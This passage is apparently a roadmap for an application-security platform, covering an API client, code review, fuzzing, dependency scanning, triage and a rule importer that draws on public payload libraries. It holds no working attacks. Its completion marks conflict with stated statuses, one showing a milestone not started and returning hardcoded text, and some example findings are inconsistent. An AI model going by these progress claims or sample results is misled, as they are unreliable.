  - Public/private mock: share mock URL with team or keep private
  - Logs: all requests hitting the mock server with timestamps
- **Code Generation:**
  - Generate ready-to-run code snippets from a request in **20+ languages/frameworks:**
    | Language | HTTP Library |
    |----------|-------------|
    | cURL | curl command |
    | Python | requests, http.client, aiohttp |
    | JavaScript | fetch, axios, XMLHttpRequest, got |
    | TypeScript | fetch (typed), axios (typed) |
    | Node.js | native https, axios, node-fetch, undici |
    | Go | net/http, resty |
    | Java | OkHttp, HttpClient (Java 11+), Unirest |
    | C# | RestSharp, HttpClient |
    | Ruby | Net::HTTP, Faraday, RestClient |
    | PHP | cURL, Guzzle, pecl_http |
    | Rust | reqwest, ureq |
    | Kotlin | OkHttp, Ktor |
    | Swift | URLSession, Alamofire |
    | PowerShell | Invoke-WebRequest, Invoke-RestMethod |
    | Shell | wget, httpie |
  - Generated code includes: URL, method, headers, query params, body, auth
  - One-click copy to clipboard
  - Configurable: include comments, error handling boilerplate, timeout settings
- **API Documentation Auto-Generation:**
  - Generate Markdown/HTML docs from collection
  - Includes: endpoint list, method, URL, description, headers, body schema, example request, example response
  - Authentication section: auth type, how to obtain credentials
  - Publish: hosted docs page at `https://docs.appsec.local/organization/collection-slug`
  - Auto-update: docs re-generate when collection changes
  - Export: static HTML, PDF, Markdown
- **Response Viewer Enhancements:**
  - **Pretty:** JSON/XML/HTML with syntax highlighting, collapsible nodes, line numbers
  - **Raw:** plain text with search, line wrap toggle
  - **Preview:** render HTML responses in sandboxed iframe
  - **Headers:** sortable table with key, value, description lookup
  - **Cookies:** parsed cookie jar with domain, path, expiry, Secure/HttpOnly/SameSite flags
  - **Timing:** waterfall breakdown — DNS lookup, TCP connect, TLS handshake, TTFB, download
  - **Size:** request body, response body, headers, total transferred
  - **Hex View:** hex dump for binary responses
  - **Diff:** compare two responses side-by-side with highlighted changes
- **Binary & Multipart Support:**
  - File picker for binary body upload
  - Multipart form builder: add text fields + file fields
  - Auto-detect MIME type from file extension
  - Base64 encode/decode binary content
  - Streaming response display for large downloads

**Success Criteria:**
```
Mock server: Create mock from collection → POST /api/login returns {"token":"mock-jwt"}
  → 50ms simulated latency → Logs show 127 requests hit mock in last hour
Code gen: GET request with Bearer auth → Generate Python/requests → Copy → Paste → Runs
Documentation: Collection "Payment API" → Publish docs → https://docs.appsec.local/org/payment-api
Response viewer: JSON response → Pretty mode → Collapse deep nested arrays → Find "customer.email"
  → Waterfall: DNS: 12ms | TCP: 34ms | TLS: 89ms | TTFB: 145ms | Download: 23ms → Total: 303ms
Multipart: Add fields (name, description) + file (profile.png) → MIME auto-detected → Uploaded
```

---

### Milestone 7e: API Client — Workspaces, Catalog & Collaboration ✅
**Deliverables:**
- **Workspaces:**
  - Personal workspace: private to user, all personal collections
  - Team workspace: shared with team, collections + environments + monitors
  - Public workspace: view-only for external stakeholders (API consumers)
  - Workspace roles: Admin, Editor, Viewer
  - Workspace activity feed: who created/edited/ran what
- **API Catalog (Internal API Network):**
  - Publish collections to org-wide catalog
  - Browse: search by service name, tag, team, endpoint path
  - "Try it" button: open any catalog endpoint in API client
  - Service ownership: each collection assigned to a team
  - API versioning: track multiple versions of same API
  - Deprecation notices: mark endpoints/collections as deprecated with sunset date
  - Consumer metrics: who's calling your API (from mock/monitor data)
- **Collection Version Control:**
  - Fork a collection → make changes → merge back
  - Change tracking: who changed what, when
  - Rollback: revert collection to previous version
  - Branch: maintain v1, v2, v3 of same collection
  - Conflict resolution: visual merge tool for collection JSON
- **Scratch Pad:**
  - Transient request area — no save needed
  - Quick test endpoint without cluttering collections
  - History preserved in scratch pad separately
  - "Save to Collection" — promote scratch request to collection
- **Tagging & Organization:**
  - Tag requests with: `smoke`, `regression`, `critical-path`, `slow`, `flaky`
  - Filter collection runner by tags: "Run only smoke tests on every deploy"
  - Color-coded folders
  - Request descriptions: Markdown with code blocks, links

**Success Criteria:**
```
Workspace: "Platform Team" workspace → 3 collections, 120 requests, 5 members
  → Activity: "jdoe added 3 new tests to User API", "api-test monitor passed"
API Catalog: Browse → Search "payment" → Find Payment API v2 → "Try it" → Opens in client
Version control: Fork Payment API v2 → Add 5 endpoints → Create merge request → Review → Merge
Scratch pad: Type URL, send, close tab → Returns later → Request in scratch pad history
Tags: Tag 20 requests as "smoke" → `appsec run collection --tags smoke` → Only smoke tests run
```

---

### Milestone 8: Workers & Queue System ✅
**Status:** In Progress — Workers exist but several return hardcoded mock data
**Deliverables:**
- SAST Worker: 4 concurrent jobs, 10/min rate limit
- DAST Worker: 2 concurrent jobs, 5/min rate limit
- API Scanner Worker: 4 concurrent jobs, 10/min rate limit
- Backend Worker: General job processing
- Report Worker: 2 concurrent jobs with Puppeteer for PDF
- Job lifecycle: progress updates, retry with exponential backoff, cancel, pause/resume

**Success Criteria:**
```
Enqueue job → Worker picks up → Progress 0→100% → DB updated → WS event emitted
Failed job → Retries 3x with backoff → Moves to failed queue after exhaustion
```

---

## Phase 2 — Code Review & Fuzz Analysis Module

### Milestone 9: Database Schema — Code Review Tables ✅
**Status:** Complete
**Deliverables:**
- 13 new tables: git_connections, code_reviews, code_review_findings, code_fixes,
  fuzz_tests, fuzz_cases, fuzz_crashes, dependency_scans, dependency_findings,
  repo_health_metrics, sarif_exports, code_index, review_comments

**Success Criteria:**
```
Run migration 002 → All 13 tables exist with indexes and constraints
INSERT into code_reviews → succeeds with foreign key validation
```

---

### Milestone 10: Semantic Code Review Engine ✅
**Status:** Complete
**Deliverables:**
- 25 deep semantic analysis rules across 30+ languages
- Detection categories: Null dereferences, Race conditions, Memory leaks, Integer overflow,
  Logic errors (always-true, assignment-in-conditional), Off-by-one, Unsafe casting,
  Exception handling flaws, Missing authorization, Broken object-level auth,
  Business logic flaws, Trust boundary violations, Unreachable code, Resource leaks,
  Infinite loop detection
- Structured AI output: root cause, security impact, business impact, exploitability
  assessment, recommended fix, secure code example, confidence score, false positive probability
- Context-aware: confidence scoring adjusts based on surrounding code patterns

**Success Criteria:**
```
Scan Spring Boot project → Finds missing @PreAuthorize on DELETE endpoint
Scan Go project → Finds goroutine race condition on shared map
Scan Python project → Finds except: pass swallowing all exceptions
Each finding includes: AI summary, CVSS score, CWE mapping, code-level fix example
```

---

### Milestone 11: Secure Fuzz Analysis Engine ✅
**Status:** Complete
**Deliverables:**
- 13 fuzz strategies: boundary integers, unicode edge cases, format strings, oversized inputs,
  nested structures, random bytes, XML malformed, ReDoS patterns, path traversal, JSON edge cases,
  null-byte injection, type confusion, HTTP smuggling
- 8 target types: REST API, GraphQL, SOAP, JSON parser, XML parser, File parser, CLI parser,
  Config parser, Serialization, Deserialization, Regex, Input Validation, Auth Workflow
- 100+ payload dictionaries: boundary values, unicode, format strings, SQLi, CMDi, XML, JSON, ReDoS
- Crash analysis: segfault, panic, exception, stack overflow, memory exhaustion, timeout,
  resource exhaustion → auto-mapped to severity + CWE + CVSS + recommendation
- Deterministic reproduction: capture reproduction input + steps per crash signature

**Success Criteria:**
```
Fuzz a JSON parser → 1000 iterations → Find 3 unique crashes
Crash 1: StackOverflow on nested depth 2000+ → CWE-121, CVSS 7.5
Crash 2: OOM on 100MB input → CWE-789, CVSS 7.5
Crash 3: Panic on null byte in key → CWE-248, CVSS 5.0
Each crash has: reproduction input, stack trace, severity, CWE, recommendation
```

---

### Milestone 12: Dependency Analysis Engine (SCA) ✅
**Status:** Complete
**Deliverables:**
- 8 ecosystem support: npm, pip, Maven, Gradle, NuGet, Cargo, Composer, Go Modules
- Manifest auto-detection: package.json, requirements.txt, pom.xml, build.gradle,
  Cargo.toml, go.mod, composer.json, Gemfile, Pipfile, pyproject.toml
- Embedded vulnerability database with CVE/EPSS/KEV correlation
- Typo-squatting detection (Levenshtein distance against top 100 packages per ecosystem)
- Dependency confusion detection (internal-looking package names)
- License compliance: GPL/AGPL/WTFPL/Unlicense flagging
- Deprecated/EOL package detection

**Success Criteria:**
```
Scan Node.js project → Find log4j@2.14.0 → Flag CVE-2021-44228 critical + KEV + EPSS 0.975
Scan Python project → Find `reqwest` → Flag: Typosquatting of `requests` (edit distance: 2)
Scan Go project → Find `mycompany-internal-lib` on public registry → Flag: Dependency confusion risk
```

---

### Milestone 13: Repository Health Metrics Engine ✅
**Status:** Complete
**Deliverables:**
- Cyclomatic complexity (McCCabe) per file/function
- Cognitive complexity per file
- Maintainability Index (SEI formula: HV, MI, LOC, complexity, comments)
- Technical Debt Ratio (SQALE-based): remediation hours / development hours
- Duplicate code detection (cross-file line hashing)
- Architecture smell detection: God Classes (>500 LOC + >50 complexity),
  Large Packages (>50 files in one directory)
- Risk score: weighted from complexity, duplication, architecture smells, method count

**Success Criteria:**
```
Analyze 100K-line monorepo → Returns:
  • MI: 67/100 (warning zone)
  • Tech Debt: 14.5%
  • 3 God Classes detected
  • 2 Large Packages (>50 files)
  • 8.2% duplication
  • Risk Score: 42/100
```

---

### Milestone 14: Git Integration & Incremental Scanning ✅
**Status:** In Progress
**Deliverables:**
- [x] Clone: HTTPS + SSH with token/OAuth/SSH auth
- [x] Pull: fetch + checkout + reset for branch sync
- [x] Diff: git diff --name-status between commits
- [x] Commit history: git log with stats between base and target hash
- [x] Webhook parsers: GitHub (push/pull_request), GitLab (push/merge_request), Bitbucket (push)
- [ ] Webhook auto-trigger: on push → queue incremental review
- [ ] Incremental scan: only re-analyze changed files + affected callers
- [ ] Branch comparison: scan diff between feature branch and main
- [ ] Monorepo path filtering: only scan changed sub-projects
- [ ] PR status reporting: post scan results as PR comment + status check

**Success Criteria:**
```
Connect GitHub repo → Clone → Run full scan → 500 findings
Push 3 commits (change 12 files) → Auto-detect → Incremental scan → 8 new findings, 2 resolved
PR status: ❌ Blocked — 1 critical finding introduced
```

---

### Milestone 15: AI Review Engine & Automated Fixes ✅
**Status:** Not Started — Returns hardcoded analysis text only
**Deliverables:**
- Structured AI findings: Executive Summary, Developer Summary, Root Cause Analysis,
  Security Impact, Business Impact, Exploitability Assessment, Recommended Fix,
  Secure Code Example, Alternative Mitigations, Confidence Score,
  False Positive Probability, Technical References
- Automated fix suggestions: original code → suggested replacement → explanation →
  security benefit → potential side effects → confidence level
- One-click patch export: unified diff format, applicable via `git apply`
- Never auto-modify without user approval

**Success Criteria:**
```
Finding: "Missing null check in UserService.java:42"
→ AI: "This could cause NPE if getUser() returns null..."
→ Fix: "if (user != null) { user.updateProfile(data); } else { throw new NotFoundException(); }"
→ Confidence: 0.92
→ Export: unified diff file downloaded
```

---

### Milestone 16: Code Review API Routes ✅
**Status:** Complete
**Deliverables:**
- 20+ REST endpoints across 7 resource groups
- Git Connections: CRUD for repo connections
- Reviews: launch, list, get, cancel
- Findings: list, filter, update status, assign, comment
- Automated Fixes: view, apply, export as patch
- Fuzz Tests: launch, list, crash details
- Dependency Scans: list, findings detail
- Health Metrics: per-review retrieval
- SARIF Export: full 2.1.0 spec compliance
- Webhook: receive GitHub/GitLab/Bitbucket push events

**Success Criteria:**
```
POST /api/code-review/reviews/launch → returns review ID
GET /api/code-review/reviews → paginated list with severity breakdown
GET /api/code-review/findings?severity=critical&findingType=security → filtered results
GET /api/code-review/reviews/:id/export-sarif → valid SARIF 2.1.0 JSON
```

---

### Milestone 17: Frontend Code Review Workspace ✅
**Status:** Complete
**Deliverables:**
- 6-tab workspace: Reviews, Findings, Dependencies, Fuzz Tests, Health, Launch
- Findings drill-down: list → detail panel with Overview/Code/AI Analysis tabs
- Severity + type filters with real-time client-side filtering
- Health dashboard: maintainability gauge, complexity metrics, architecture smells
- Dependency cards: vulnerable/deprecated/supply-chain risk counts
- Fuzz test table: iterations, crashes, exceptions, timeouts
- Launch form: target type, review type, Git connection, priority, auto-rescan toggle

**Success Criteria:**
```
Navigate to /code-review → See 6 tabs active
Click Reviews tab → See table of past reviews with severity counts
Click a review → View its findings
Click a finding → See AI analysis with code snippet, fix suggestion
Click Fuzz → See fuzz test results with crash counts
Click Launch → Submit form → Review appears in list
```

---

### Milestone 14a: PR Decoration & Developer Workflow ✅
**Deliverables:**
- **Inline PR Annotations on Affected Lines:**
  - GitHub Checks API: post annotations on the exact line of each finding
  - GitLab MR Discussions: thread on the affected line in the diff
  - Bitbucket Code Insights: inline report annotations
  - Each annotation shows: severity icon, rule name, 1-line summary, "View Full Details" link
- **PR Summary Comment:**
  - Auto-post or update a single PR comment with:
    - Severity breakdown: "🔴 2 Critical | 🟠 5 High | 🟡 12 Medium | 🔵 3 Low"
    - New vs. existing: "3 new findings introduced, 1 fixed since last scan"
    - Top 3 findings with severity, file, line, short description
    - Link to full dashboard review
    - "✅ All clear — no new findings" when clean
- **PR Status Check Integration:**
  - Commit status: ✅ (green) / ❌ (red) based on severity threshold
  - Required status check: enforce via branch protection rules
  - Per-severity thresholds: "Fail on ≥1 critical OR ≥3 high OR ≥10 medium"
  - "Advisory mode": post findings but never block (for rollout period)
- **Code Owner Auto-Assignment:**
  - Parse CODEOWNERS / .gitlab/CODEOWNERS → auto-assign findings to owning team/developer
  - Round-robin assignment within team for unowned code
  - Auto-create Jira/GitHub Issue assigned to code owner
- **Slack/Teams Notifications:**
  - PR opened → "🔍 Scanning PR #1234..."
  - PR scanned → "✅ PR #1234: 0 new findings — safe to merge"
  - PR blocked → "🚨 PR #1234: 3 critical findings — merge blocked"
  - DM to developer: "You introduced 2 new high-severity findings in PR #1234. Fixes available."
- **Commit-Level Attribution:**
  - `git blame` to find who introduced each finding
  - Track: who introduced vs. who fixed
  - Don't blame/shame — use for routing and coaching

**Success Criteria:**
```
PR opened with 3 changed files → Scan completes in 45s →
  → GitHub Checks API: 2 annotations posted on UserService.java:L42 and L87
  → PR comment: "2 new findings (1 critical SQLi, 1 high NPE) — merge blocked"
  → PR check: ❌ appsec-scan (threshold: critical > 0)
  → Critical finding auto-assigned to @jdoe (CODEOWNERS for src/users/)
  → Slack: "🚨 @jdoe: Critical SQLi in PR #1234 — please fix before merging"
```

---

### Milestone 14b: Baseline Management & Triage System ✅
**Deliverables:**
- **Baseline File (`.appsec-baseline.json`):**
  - Snapshot of all known/existing findings at a point in time
  - Baseline committed to repo → CI only alerts on *new* findings
  - Auto-update baseline after fixing: `appsec baseline update`
  - Baseline diff: "12 findings added to baseline, 7 removed (fixed)"
  - Baseline drift alerts: "Baseline is 90 days old — consider rebaselining"
- **Finding Lifecycle States:**
  - `open` → `triaged` → `in_progress` → `fixed` → `verified` → `closed`
  - `false_positive` → `reviewed` → `confirmed_fp` or `reopened`
  - `wont_fix` → must include justification + approver
  - `accepted_risk` → must include risk acceptance reason + expiry (auto-reopens)
  - `deferred` → deferred to version/date + auto-reopens
  - `not_reproducible` → with reproduction attempt notes
- **Bulk Triage Operations:**
  - Multi-select findings → Apply status: "Mark all 15 as false positive (same rule)"
  - Bulk assign: "Assign all findings in src/auth/ to @security-team"
  - Bulk suppress: "Suppress all SAST-RCE-* findings in test/ directory (excluded path)"
  - Keyboard shortcuts: `j`/`k` navigate, `f` false positive, `a` accept, `w` wont-fix, `Enter` details
- **Severity Overrides:**
  - Per-org, per-project, per-rule severity adjustment
  - Override with justification + approver: "Rule SAST-SQLI-001: critical→medium for test fixtures only"
  - Expiry on overrides: auto-reverts after N days
  - Override audit trail: who, when, why, approved by
- **False Positive Management:**
  - Mark finding as FP → system records: "Rule X, file pattern Y, code pattern Z"
  - FP patterns learned: similar findings auto-suppressed with "Likely FP — matches pattern from #12345"
  - FP review queue: all auto-suppressed findings in a review list for periodic human validation
  - FP rate dashboard: per-rule FP rate → identify noisy rules for tuning
- **Noise Reduction:**
  - Deduplicate findings with same root cause across branches
  - Cross-file merge: "This SQLi pattern repeats 47 times in 12 files — show as 1 finding with 47 occurrences"
  - Test code filtering: automatically lower severity or suppress in `test/`, `spec/`, `__tests__/`

**Success Criteria:**
```
Baseline: 500 existing findings → Run scan → 3 new + 2 fixed → Only 3 new alerted
Bulk triage: Select 15 findings → "Mark all as FP (same rule)" → 15 resolved in 2 clicks
Severity override: "Rule X in test/ → suppress" → 200 test findings suppressed
FP learning: Mark 5 similar SQLi FPs → System auto-suppresses 12 more matching the pattern
Deduplication: 47 identical findings → 1 finding with "Occurs 47 times across 12 files"
```

---

### Milestone 14c: Fix Verification & SLA Tracking ✅
**Deliverables:**
- **Automated Fix Verification:**
  - Developer claims "fixed" → Auto-trigger targeted rescan of the affected file + function
  - Verification result: ✅ Verified Fixed | ❌ Still Present | ⚠️ Partially Fixed (new variant)
  - Integration with PR workflow: fix PR opened → scan runs → if finding gone → auto-close
  - Regression detection: fix for finding A introduced finding B → flag it
- **Remediation SLA Tracking:**
  - Per-severity SLAs: Critical=24h, High=7d, Medium=30d, Low=90d, Info=180d
  - SLA clock: starts when finding is `triaged`, pauses during `deferred`, resets on `reopened`
  - SLA breach alerts: "🚨 3 critical findings past 24h SLA — escalation triggered"
  - SLA dashboard: "94% within SLA this month — up from 87% last month"
  - Auto-escalation: breach critical SLA → notify team lead; breach again → notify security director
- **Remediation Campaigns:**
  - "Fix all CWE-89 (SQLi) findings across all projects this quarter"
  - Campaign progress tracking: 14/32 fixed (43.7%)
  - Leaderboard per campaign: "Team A: 8 fixed | Team B: 4 fixed | Team C: 2 fixed"
- **Developer Performance Metrics:**
  - Fix rate: findings fixed / findings assigned (per developer, per team)
  - Mean Time to Fix (MTTF): average hours from assigned to verified-fixed
  - Introduction rate: new findings introduced per 1,000 lines changed
  - Net fix ratio: findings fixed minus findings introduced
  - Trend: "Your fix rate improved from 62% → 78% this quarter"
  - Team comparison: "Team Alpha fixes 3.2x faster than company average"

**Success Criteria:**
```
Finding marked "fixed" → Auto-rescan → Finding gone → Auto-closed with ✅ verified
Critical finding: 23h old → No SLA breach → Green
Critical finding: 25h old → SLA breached → Escalation to team lead
Campaign: "Q3 SQLi Elimination" → 14/32 fixed → 43.7% → On track
Developer: @jdoe fixed 47 findings this month, MTTF=3.2h → Top 5% fixer
```

---

### Milestone 14d: Developer Experience — IDE, Pre-commit, Config ✅
**Deliverables:**
- **IDE Plugins:**
  - **VS Code:** Real-time scan as you type; squiggly underlines on findings; hover for details
  - **JetBrains (IntelliJ, PyCharm, GoLand, WebStorm):** Inspection integration; findings in Problems panel
  - **Eclipse:** Marker integration
  - **Neovim/Vim:** LSP integration via diagnostic provider
  - All plugins: show severity, rule name, quick-fix button, "View in Dashboard" link
- **Pre-commit Hook:**
  - Install via: `npx @appsec/hooks install` or `pre-commit install`
  - Staged files only → scan in <5 seconds
  - Block commit if: secrets found, critical SAST finding in staged code
  - Warning mode: "⚠️ 3 medium findings — commit anyway? [y/N]"
  - Skip with justification: `git commit -m "WIP" --no-verify` → logged for audit
- **Configuration-as-Code (`.appsec.yml`):**
  ```yaml
  # .appsec.yml — committed to repo root
  version: 1
  project: my-service
  scan:
    languages: [typescript, python, terraform]
    exclude_paths: [test/, vendor/, generated/]
    severity_threshold: medium
  rules:
    disable: [SAST-DEBUG-001]  # console.log in Node is fine for us
    override:
      - id: SAST-SECRET-001
        severity: critical  # we treat secrets as critical
  pr_checks:
    fail_on: critical  # block merge on critical findings
  code_owners:
    path: .github/CODEOWNERS
  ```
- **CLI Tool (`appsec`):**
  - `appsec scan` — run full scan locally
  - `appsec scan --diff` — scan only uncommitted changes
  - `appsec scan --pre-commit` — fast pre-commit scan (staged files only)
  - `appsec baseline init` — create baseline from current findings
  - `appsec baseline update` — update baseline after fixes
  - `appsec config validate` — validate .appsec.yml
  - `appsec rules test --rule SAST-001 --file test.java` — test a rule against code
- **Developer Safety Net:**
  - Warn about dangerous APIs as developer types (like GitHub Copilot security warnings)
  - "⚠️ `eval()` detected — this is flagged as DANGER-001 (Code Injection)"
  - "⚠️ `innerHTML` assigned from user input — potential XSS (XSS-001)"
  - Provide secure alternative in-line: "Consider using `textContent` instead"

**Success Criteria:**
```
VS Code: Type `eval(userInput)` → Red squiggly → Hover: "DANGER-001: Code Injection"
Pre-commit: `git commit` → Scans 3 staged files → "Critical: API key found in config.ts" → Blocked
.appsec.yml: Change fail_on to 'high' → commit → Next PR now allows medium findings
CLI: `appsec scan --diff` → Only scans 4 changed files → Results in 3.2s
```

---

### Milestone 14e: Advanced Code Analysis ✅
**Deliverables:**
- **Vulnerability Reachability Analysis:**
  - Is the vulnerable function *actually called* from an untrusted entry point?
  - Call graph construction: from HTTP handler → controller → service → vulnerable function
  - Reachability scoring: 1.0 (directly reachable) → 0.0 (dead code / only test calls)
  - Filter by reachability: "Show me only findings reachable from external input"
  - Unreachable findings: auto-lower severity, don't block PRs
- **Hotspot Detection (Security-Aware Code Review):**
  - Flag high-risk code areas even when no specific vulnerability is found
  - Triggers: "This function handles authentication", "This module processes payments"
  - "Security Hotspot — requires human review" even if automated scan found nothing
  - Hotspot categories: auth, payments, PII, admin functions, crypto, file upload, user input parsing
  - Integration: hotspotted code gets mandatory human review before merge
- **Cross-Repository Analysis:**
  - Copy-paste detection across repos: "This vulnerable code block also exists in 3 other repos"
  - Shared library risk: "Library X has a known CVE — it's used in 7 of 15 repos"
  - Cross-repo finding correlation: "Same SQLi pattern found in repo-A, repo-B, repo-C"
  - Microservice blast radius: "This auth bypass affects 4 downstream services"
- **Data Flow Visualization:**
  - Auto-generate data flow diagrams from source → sink analysis
  - Visualize taint paths: `req.body.username` → `buildQuery()` → `db.execute()` — no sanitizer
  - Export as: PNG, SVG, PlantUML for threat modeling docs
- **Architecture Compliance:**
  - Define architecture rules: "Controllers must not access database directly"
  - "Service layer must be between controller and repository"
  - "No circular dependencies between modules"
  - Auto-detect violations: "PaymentController directly imports DatabaseConnection"
- **Language-Specific Best Practices:**
  - Go: defer close, error wrapping, context propagation, goroutine leaks
  - Python: context managers, type hints, async/await patterns, mutable defaults
  - Java: try-with-resources, Optional vs null, equals/hashCode consistency
  - TypeScript: strict null checks, discriminated unions, exhaustiveness checking
  - Rust: unsafe block audit, unwrap/expect in production code, Send/Sync violations

**Success Criteria:**
```
Finding: SQLi in reportService.generate() → Reachability: 0.0 (only called from cron job, no user input)
  → Auto-lowered from critical to low → Doesn't block PR
Hotspot: "This module handles payments — requires manual security review"
  → PR blocked until security team approves
Cross-repo: "Vulnerable pattern found in 3 repos: api-gateway, user-service, billing"
  → One fix propagates to all 3
Data flow: Auto-generated diagram shows taint path from req.body → SQL → Response
Architecture: "UserController directly imports Database — violates architecture rule"
```

---

### Milestone 14f: Security Debt Quantification & Analytics ✅
**Deliverables:**
- **Security Debt Score (per repo, per team, per org):**
  - Composite score combining: finding count × severity × age × reachability
  - "Your security debt is 847 points — equivalent to ~35 engineer-days of remediation"
  - Trend: "Debt decreased 23% this quarter — on track for target"
- **Cost of Delay Analysis:**
  - Estimate business impact: "Critical SQLi unremediated for 30 days — estimated risk exposure: $X"
  - Based on: data sensitivity (PII/PCI/PHI), exploitability, public exposure
- **Team Benchmarking:**
  - Compare teams: findings/KLOC, fix rate, MTTF, security debt trend
  - Anonymous: team names not shown, only "Team A, B, C" — no blame culture
  - Industry benchmarking: "Your security posture is in the top 25% of fintech companies"
- **Executive Security Scorecard:**
  - One-page summary for CISO/VP Engineering: overall score, trend, top risks, SLA health
  - Auto-generated monthly: PDF + interactive dashboard
  - Comparison to industry peers (anonymized, opt-in)
- **Predictive Analytics:**
  - "At current fix rate, all critical findings will be resolved by August 2027"
  - "Team velocity suggests 14 new findings/month → backlog grows by 8/month net"
  - "If you fix these 10 findings, security score improves from C+ → B"

**Success Criteria:**
```
Security debt: 847 points → Trending down -23% QoQ → On track for Q4 target
Cost of delay: "SQLi in payment service unremediated for 30d → Estimated exposure: $2.3M"
Team benchmark: "Team Phoenix: 0.8 findings/KLOC (top 10%) | MTTF: 4.2h (top 25%)"
CISO report: "Overall posture: B+ (81/100). Top risk: payment-service (3 critical SQLi)"
Prediction: "At current velocity, critical backlog clears in 6.2 weeks"
```
- Semgrep YAML rule importer: parse pattern, pattern-either, pattern-regex, metavariable
- CodeQL `.ql` importer: query metadata extraction
- Nuclei YAML template importer: HTTP + DNS + TCP + SSL templates
- Checkov policy importer: Terraform, CloudFormation, K8s policies
- Gitleaks pattern importer: 200+ regex-based secret patterns
- TruffleHog detector importer: 800+ secret detectors
- Bandit plugin importer: Python AST-based rules
- GoSec rule importer: Go security rules
- PMD/SpotBugs XML rule importer: Java rules
- Internal canonical format: all imported rules normalized to a single JSON schema
- Rule metadata: source repository, license, version, import date, language scope

**Success Criteria:**
```
appsec rules import --source semgrep-rules --path ./semgrep-rules/java/
→ Imports 350 Java rules with CWE mappings
appsec rules import --source nuclei-templates --path ./nuclei-templates/cves/
→ Imports 200 CVE-specific DAST templates
appsec rules import --source gitleaks
→ Imports 200 secret patterns as SAST rules
Total: 3,000+ rules available in rule library
```

---

### Milestone 18: Universal Rule Importer ✅
**Deliverables — import rules, detectors, payloads, and vulnerability data from 25+ authoritative sources:**

| Source | Type | Volume | Import Format | Use |
|--------|------|--------|---------------|-----|
| **semgrep/semgrep-rules** | SAST rules | 3,000+ YAML rules | Semgrep YAML → canonical | 30+ languages, security+quality |
| **github/codeql** | SAST queries | 5,000+ `.ql` queries | CodeQL → canonical | Multi-language semantic analysis |
| **gitlab-org/security-products/sast-rules** | SAST rules | 500+ rules | GitLab format → canonical | 20+ languages |
| **trailofbits/semgrep-rules** | SAST rules | 200+ rules | Semgrep YAML → canonical | C/C++, Go, Python, Rust |
| **securego/gosec** | SAST rules | 40+ Go rules | GoSec config → canonical | Go-specific security |
| **PyCQA/bandit** | SAST rules | 70+ Python rules | Bandit plugin → canonical | Python AST-based |
| **spotbugs/spotbugs** | SAST rules | 400+ Java detectors | SpotBugs XML → canonical | Java bug patterns |
| **find-sec-bugs** | SAST rules | 100+ Java rules | FindSecBugs → canonical | Java security |
| **pmd/pmd** | SAST rules | 300+ rules | PMD XML → canonical | Java + multi-language quality |
| **projectdiscovery/nuclei-templates** | DAST templates | 9,000+ YAML | Nuclei YAML → canonical | CVE, misconfigs, exposures |
| **fuzzdb-project/fuzzdb** | Fuzz payloads | 10,000+ payloads | Directory → fuzz corpora | SQLi, XSS, LFI, RCE, format strings |
| **swisskyrepo/PayloadsAllTheThings** | Attack payloads | 500+ categories | Markdown → fuzz corpora | Comprehensive attack payload library |
| **danielmiessler/SecLists** | Wordlists | 100+ lists | Files → discovery wordlists | Fuzzing, discovery, usernames, passwords |
| **gitleaks/gitleaks** | Secret patterns | 200+ regex | Gitleaks config → canonical | Secret detection patterns |
| **trufflesecurity/trufflehog** | Secret detectors | 800+ detectors | TruffleHog → canonical | Secret detection |
| **bridgecrewio/checkov** | IaC policies | 1,000+ policies | Checkov Python → canonical | Terraform, CF, K8s, Helm, Bicep |
| **aquasecurity/trivy** | Container + IaC | CVEs + misconfigs | Trivy DB → canonical | OS packages, language packages, K8s |
| **aquasecurity/tfsec** | Terraform rules | 100+ rules | tfsec → canonical | AWS/Azure/GCP Terraform |
| **anchore/grype** | Vulnerability DB | CVEs | Grype DB → canonical | OS + language package CVEs |
| **anchore/syft** | SBOM generator | — | Syft → SBOM import | Generate SBOM from images/filesystems |
| **MobSF/Mobile-Security-Framework-MobSF** | Mobile rules | 100+ rules | MobSF → canonical | Android + iOS security |
| **OWASP/owasp-mastg** | Mobile test guide | 150+ checks | MSTG → canonical | Mobile security testing |
| **OWASP/ASVS** | Verification standard | 286 requirements | ASVS → rule mapping | All application security |
| **OWASP/wstg** | Web testing guide | 200+ test procedures | WSTG → canonical | Web security testing |
| **CIS Benchmarks** | Hardening guides | 100+ benchmarks | CIS → canonical | Docker, K8s, Linux, AWS, GCP, Azure |
| **OSV.dev** | Vulnerability DB | 100,000+ records | OSV API → CVE feed | Open source vulnerabilities |
| **GitHub Advisory DB** | Vulnerability DB | 20,000+ records | GHSA → CVE feed | npm, pip, Maven, RubyGems, NuGet, Go |

- **Sync Engine:**
  - Scheduled pull from all sources (configurable per-source cron)
  - Diff detection: only download and process changed rules
  - Version pinning: lock to specific commit/tag/release of source repo
  - Auto-merge: new rules from upstream merged with local customizations (severity overrides, exclusions preserved)
  - Conflict resolution: if local edit conflicts with upstream update → flag for human review
  - Deprecation handling: if upstream removes a rule → mark as "deprecated" locally, don't auto-delete
- **Canonical Rule Format:**
  - All imported rules normalized to a single JSON schema regardless of source
  - Fields: id, name, description, severity, languages, cwe_id, owasp_category, cvss_score, patterns, source_repo, source_license, import_date, source_version
  - Enables: cross-source deduplication, unified search, unified rule management

**Success Criteria:**
```
appsec rules sync --all → 25 sources synced → 12,000+ rules/detectors/payloads imported
Weekly auto-sync: 3 sources updated → 45 new rules, 12 modified, 2 deprecated → Auto-merged
Rule library total: 12,000+ canonical rules from 25 golden sources
Deduplication: 450 duplicate rules detected across sources → Merged into single canonical entries
```

---

### Milestone 19: Central Rule Management System ✅
**Deliverables:**
- Rule Library Dashboard: browse, search, filter by language/CWE/severity/source
- Rule Versioning: track changes, diff between versions, rollback
- Rule Enable/Disable: per-organization, per-project, per-team
- Rule Severity Override: org can adjust severity of imported rules
- Rule Tuning: add exclusion patterns, file path filters
- Custom Rule Builder: visual form + YAML editor with live validation
- Rule Testing Sandbox: paste code → test rule → see if it fires
- Rule Effectiveness Dashboard: false positive rate, true positive rate, finding count per rule
- Scheduled Sync: cron-based pull from upstream repos with auto-merge
- Conflict Detection: flag overlapping rules from different sources
- Rule Promotion Pipeline: Draft → Testing → Production

**Success Criteria:**
```
Browse rules: Filter to Java + CWE-89 → See 12 SQLi rules from 4 sources
Override rule severity: Rule SEM-123 from "high" → "critical" for our org
Test a custom rule: Paste vulnerable code → Rule fires → Expected finding returned
Sync: Weekly pull from semgrep-rules → Auto-import 15 new rules, update 3 existing
Dashboard: Rule RCE-089 has 94% true positive rate, 22 findings this month
```

---

### Milestone 20: CI/CD Pipeline Integration Pack ✅
**Deliverables:**
- **GitHub Action v1** (Marketplace):
  - `appsec-platform/scan-action@v1`
